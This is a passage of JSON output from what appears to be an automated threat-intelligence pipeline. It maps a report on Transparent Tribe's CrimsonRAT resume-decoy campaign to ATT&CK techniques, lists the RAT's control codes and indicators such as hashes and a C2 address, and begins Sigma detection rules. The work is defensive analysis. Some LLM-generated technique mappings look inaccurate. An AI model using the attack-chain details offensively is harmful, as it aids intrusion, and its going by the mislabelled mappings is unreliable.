            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "command and control channel"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "58139738-0280-4f72-94f5-628e4751a61e",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1021 - Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "The attacker uses the CrimsonRAT malware to establish a remote connection to the compromised system.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "remote connection"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fbb5b46e-9b2b-48fe-91dd-f66d2d01592c",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1497 - Virtualization/Sandbox Evasion",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the CrimsonRAT malware to evade virtualization and sandbox detection.",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5183dbf1-d30b-4b95-897b-f31fe9f647d7",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a58fe6f7-1eeb-4091-8640-68c488a055b4",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d8b1fe89-39a8-4b32-80d6-df3ee81362d5",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Account Discovery",
            "attack_id": "T1087",
            "tactic": "Discovery",
            "description": "Detected Account Discovery activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3f9e9579-765a-470c-b42e-5b97deb2b068",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "46153124-d82c-44a4-a4ea-ecbe8ea0b83e",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f147e587-2728-44cd-b6f2-296dfabe1694",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 4 Analysis of APT-C-56 (Transparent Tribe) camouflage resume attack campaign mp.weixin.qq.com/s/xU7b3m-L2OlAi2bU7nBj0A Included in the collection  APT 87 piece   \u5357\u4e9a\u5730\u533a 26 piece  APT-C-56 Transparent Tribe 7 piece APT-C-56 Transparent Tribe APT-C-56 (Transparent Tribe)  also known as Transparent Tribe  APT36  ProjectM  C-Major  is an APT organization with a South Asian background  which has long targeted attacks on the politics and military of neighboring countries and regions (especially India)  and has developed its own exclusive Trojan horse CrimsonRAT  and has also been found to widely spread USB worms. It has been targeting India s government  public sector  and various industries including but not limited to healthcare  power  finance  manufacturing  etc. to maintain a high level of information theft activities. Earlier this year  Transparent Tribe and SideCopy were found to be using the same infrastructure and using the same themes to target similar targets  using smuggling intelligence-related decoys to camouflage Indian Defense Ministry emails to launch frequent attacks against India. We also found an attack campaign targeting the foreign trade industry using backlinks. Recently  the 360 Advanced Threat Institute detected a sample of suspected Transparent Tribe s attack activity. We speculate that the previous operation went undetected  and the sample used the bait documentation to eventually release its exclusive Trojan  CrimsonRAT. 1. Analysis of attack activities 1. Attack process analysis Attack campaigns using decoy documents that disguise resumes. Through the release of CrimsonRAT through Dropper  continuous monitoring of users in the middle of the recruitment. 2. Load delivery analysis 2 / 1 4 2.1 Disguising Documents The sample name we captured is Sonam kaur_2  the document name is similar to the sample  the file name below is Sonam Singh s document  which also uses the name of the person as the document name  and Sonam Singh s document is a personal work resume. Unlike the same attack we speculate is that the malicious document we capture only contains macro code inside the open window  and once the user inadvertently clicks to start the macro function  the hidden malicious macro code runs automatically. We also found an account with the same name on Twitter  and in the profile we can see that the status location is in Mumbai and is a wealth consulting firm. The Tweet update is as of July 2021  and while this is consistent with our presumed timing of the action  it is not possible to tell if this tweet is related to the documentation. 3 / 1 4 The macro code disguises itself as an Mdiaz-related program in the ALLUSERSPROFILE directory  reads hidden data from the specified structure of the malicious document and writes it to a file  which shows that APT-C-56 (transparent tribe) uses simple string concatenation technology to disassemble exe characters to avoid static killing by antivirus engines. 4 / 1 4 Launch the malicious PE program that is released  while further reading the normal text document data hidden inside  release it to the worddcs.docx  and finally open this document to disguise and confuse the user. 5 / 1 4 2.2 Dropper The released PE file is a .Net Dropper program. First  determine whether a zip file exists  read the resource section and write the data to the file if it does not exist  delete it and write it again. 6 / 1 4 Determine whether there is a file with the suffix .ford in the directory  and if so  create a startup file directly. If no suffix is specified  the file goes directly to the subsequent release process. 7 / 1 4 Then determine whether there is a backdoor RAT stored in the resource  and if not  download and run it from the C C through the network connection. 3. Attack component analysis The RAT backdoor released after download disguises itself as the FireFox browser and is the CrimsonRAT that the Transparent Tribe has been maintaining and using. 8 / 1 4 The control codes and commands are as follows: directives Control code Enumerate processesgey7tavs 9 / 1 4 Upload a GIF thy7umb Enumerate processespry7ocl Set up auto-start puy7tsrt Download the file doy7wf Set up screenshots scy7rsz Gets the file propertiesfiy7lsz See screenshots cdy7crgn csy7crgn csy7dcrgn Stop taking screenshotssty7ops Desktop screenshotscyr7en Gets disk informationdiy7rs Parameter initializationcny7ls Delete the file dey7lt Get file information afy7ile Delete a user udy7lt Search for files liy7stf Get user informationiny7fo 1 0 / 1 4 Execute the file ruy7nf Move files fiy7le 2. Attribution research and judgment Based on the similarity of the macro code and CrimsonRAT judging that this is an APT-C-5 6 (Transparent Tribe) attack activity  the sample found this time has many similarities to our previous APT-C-56 (Transparent Tribe) attack analysis report. 1. Analysis related to previous attacks 1.1 Macro code is similar The following figure shows the analysis from the previous disclosure action: The following figure shows the analysis of this attack: 1 1 / 1 4 1.2 Dropper is similar The following figure shows the analysis from the previous disclosure action: 1 2 / 1 4 The following figure shows the analysis of this attack: 2. Difference analysis from previous actions The last campaign released RATs directly from resources. 1 3 / 1 4 The samples found this time were downloaded via a network connection for subsequent RATs. summary The India-Pakistan conflict has always existed because of border  cultural  ethnic  historical and other reasons  and the military and political espionage caused by geopolitical conflicts has always been the main theme of the region. Pakistan s sidecopy group has been imitating 1 4 / 1 4 the Sidewinder attack  and the Indian group will also imitate the transparent tribe s attack. Chaotic situations often represent a contest of economic  military  and cybersecurity capabilities between countries  and it is increasingly important to seize intelligence opportunities through cyberattacks and maintain national security. Appendix IOC fdb9fe902ef9e9cb893c688c737e4cc7 ccc33eff063e44fad0fc3e6057b1bcd9 0f9f34e3e872e57446ffdcfa90a7b954 35e481dec398f206d0be12bc98ccc17a 33ea133da15dc060b7709558c97209d2 860da5abde63a42b3fbd8202d0cff6d2 8e642dd589e53347555a7b2596512ed7 23.254.119.234   6178 360 Advanced Threat Institute 360 Advanced Threat Institute is the core capability support department of 360 Digital Security Group  composed of 360 senior security experts  focusing on the discovery  defense  disposal and research of advanced threats  and has taken the lead in capturing many well- known 0-day attacks in the world  such as double killing  double star  nightmare formula  etc.  exclusively disclosing the advanced actions of many national APT organizations  winning wide recognition inside and outside the industry  and providing strong support for 360 to ensure national network security.",
            "commands": [],
            "file_paths": [
              "/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "APT",
              "Dropper",
              "RAT",
              "Trojan",
              "backdoor",
              "conti"
            ],
            "tools": [
              "Net",
              "at",
              "reg",
              "sc"
            ],
            "threat_actors": [
              "APT36"
            ],
            "ips": [
              "23.254.119.234"
            ],
            "domains": [
              "mp.weixin.qq.com",
              "worddcs.docx"
            ],
            "hashes": {
              "md5": [
                "0f9f34e3e872e57446ffdcfa90a7b954",
                "33ea133da15dc060b7709558c97209d2",
                "35e481dec398f206d0be12bc98ccc17a",
                "860da5abde63a42b3fbd8202d0cff6d2",
                "8e642dd589e53347555a7b2596512ed7"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing"
            ],
            "execution": [
              "User Execution: Malicious File"
            ],
            "discovery": [
              "Account Discovery"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ]
          },
          "context": "\n**File System Activity:**\n- /\n\n**Network Indicators:**\n- 23.254.119.234\n- worddcs.docx\n- mp.weixin.qq.com\n\n**Key Security Terms:** process, dropper, create, backdoor, delete, execute, upload, macro, trojan, download"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 8.954,
          "llm_processing_time_ms": 1132.263
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "f5b04a8e-70a0-4d1a-b58b-14051769e985",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1204 - User Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "The attacker uses a malicious document with macro code to execute the malware. The macro code is disguised as an Mdiaz-related program and runs automatically when the user opens the document.",
        "confidence_score": 0.716,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.548,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Sonam kaur_2",
          "Sonam Singh's document",
          "macro code"
        ],
        "tools": [
          "reg",
          "Dropper",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ef454ec8-2fcf-4529-80b8-518cc119843d",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1059 - Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "The attacker uses a .Net Dropper program to execute the malware. The program determines whether a zip file exists, reads the resource section, and writes the data to the file if it does not exist.",
        "confidence_score": 0.715,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.58,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          ".Net Dropper",
          "zip file"
        ],
        "tools": [
          "reg",
          "Dropper",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "fef36b5b-e854-4c27-b934-ac18d50d39b1",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1082 - System Information Discovery",
        "attack_id": "T1082",
        "tactic": "Discovery",
        "description": "The attacker uses the CrimsonRAT malware to gather system information, including process enumeration, file properties, and disk information.",
        "confidence_score": 0.708,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.66,
          "description_detail": 0.452,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CrimsonRAT",
          "process enumeration",
          "file properties",
          "disk information"
        ],
        "tools": [
          "reg",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ba83a58a-54f6-4089-96b6-740981577a11",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1190 - Exploit Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "The attacker uses a malicious document with macro code to exploit a public-facing application and gain initial access to the system.",
        "confidence_score": 0.698,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.468,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "malicious document",
          "macro code"
        ],
        "tools": [
          "reg",
          "Dropper",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f5dfc42b-d3b3-4e7f-aab2-415d2977262f",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1566 - Phishing",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "The attacker uses a malicious document with macro code to phish the user and gain initial access to the system.",
        "confidence_score": 0.697,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.46,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "malicious document",
          "macro code"
        ],
        "tools": [
          "reg",
          "Dropper",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "33bdbcb4-8bab-4f71-a961-e21be9b7df72",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1005 - Data from Local System",
        "attack_id": "T1005",
        "tactic": "Collection",
        "description": "The attacker uses the CrimsonRAT malware to collect data from the local system, including files and screenshots.",
        "confidence_score": 0.693,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.391,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CrimsonRAT",
          "file collection",
          "screenshot"
        ],
        "tools": [
          "reg",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8b74459a-b9d2-4a02-90e9-ca90f215b563",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1218 - Signed Binary Proxy Execution",
        "attack_id": "T1218",
        "tactic": "Defense Evasion",
        "description": "The attacker uses the CrimsonRAT malware to execute a signed binary proxy, disguising itself as the FireFox browser.",
        "confidence_score": 0.69,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.414,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CrimsonRAT",
          "FireFox browser"
        ],
        "tools": [
          "reg",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2d595ff0-9f48-42d5-8852-6398c5926a1e",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1620 - Reflective Code Loading",
        "attack_id": "T1620",
        "tactic": "Defense Evasion",
        "description": "The attacker uses the .Net Dropper program to load the CrimsonRAT malware reflectively, avoiding detection by security software.",
        "confidence_score": 0.69,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.414,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          ".Net Dropper",
          "CrimsonRAT"
        ],
        "tools": [
          "reg",
          "Dropper",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5fbd09ca-b56f-410f-8894-96131f269596",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1105 - Ingress Tool Transfer",
        "attack_id": "T1105",
        "tactic": "Defense Evasion",
        "description": "The attacker uses the .Net Dropper program to transfer the CrimsonRAT malware to the compromised system.",
        "confidence_score": 0.683,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          ".Net Dropper",
          "CrimsonRAT"
        ],
        "tools": [
          "reg",
          "Dropper",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "07ef4e38-2454-462d-8208-18f9f31028a3",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "The attacker uses the CrimsonRAT malware to exfiltrate data over the command and control channel.",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.345,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CrimsonRAT",
          "command and control channel"
        ],
        "tools": [
          "reg",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "58139738-0280-4f72-94f5-628e4751a61e",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1021 - Remote Services",
        "attack_id": "T1021",
        "tactic": "Lateral Movement",
        "description": "The attacker uses the CrimsonRAT malware to establish a remote connection to the compromised system.",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.345,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CrimsonRAT",
          "remote connection"
        ],
        "tools": [
          "reg",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "fbb5b46e-9b2b-48fe-91dd-f66d2d01592c",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "T1497 - Virtualization/Sandbox Evasion",
        "attack_id": "T1497",
        "tactic": "Defense Evasion",
        "description": "The attacker uses the CrimsonRAT malware to evade virtualization and sandbox detection.",
        "confidence_score": 0.663,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CrimsonRAT"
        ],
        "tools": [
          "reg",
          "CrimsonRAT",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5183dbf1-d30b-4b95-897b-f31fe9f647d7",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "a58fe6f7-1eeb-4091-8640-68c488a055b4",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "d8b1fe89-39a8-4b32-80d6-df3ee81362d5",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "Account Discovery",
        "attack_id": "T1087",
        "tactic": "Discovery",
        "description": "Detected Account Discovery activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "3f9e9579-765a-470c-b42e-5b97deb2b068",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "Screen Capture",
        "attack_id": "T1113",
        "tactic": "Collection",
        "description": "Detected Screen Capture activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "46153124-d82c-44a4-a4ea-ecbe8ea0b83e",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "Phishing",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "Detected Phishing activity via NLP pattern matching",
        "confidence_score": 0.621,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "f147e587-2728-44cd-b6f2-296dfabe1694",
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "technique_name": "User Execution: Malicious File",
        "attack_id": "T1204.002",
        "tactic": "Execution",
        "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
        "confidence_score": 0.621,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "sc",
          "at",
          "zip",
          "Net",
          "apt"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 18,
      "rules_generated": 18,
      "langchain_generations": 54,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 9451.859
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "T1204 - User Execution",
        "status": "success",
        "rule": {
          "title": "T1204 - User Execution via Malicious Document",
          "description": "Detects the execution of malware through a malicious document with macro code",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "selection2": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate Microsoft Office documents with macros",
            "Administrative tasks using command shells"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1204",
            "custom.mitre_attack"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1204 - User Execution",
          "generation_method": "langchain",
          "id": "23db6176-6ab4-4ed5-951d-420ee3b7e031"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1059 - Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "T1059 - Command and Scripting Interpreter via .Net Dropper",
          "description": "Detects the use of a .Net Dropper program to execute malware by checking for the existence of a zip file and reading the resource section",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|endswith": "\\dotnet.exe"
            },
            "selection2": {
              "Image|endswith": "\\powershell.exe",
              "ParentImage|endswith": "\\dotnet.exe"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate .Net applications using cmd.exe or powershell.exe",
            "Administrative tasks using .Net and command line tools"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1059 - Command and Scripting Interpreter",
          "generation_method": "langchain",
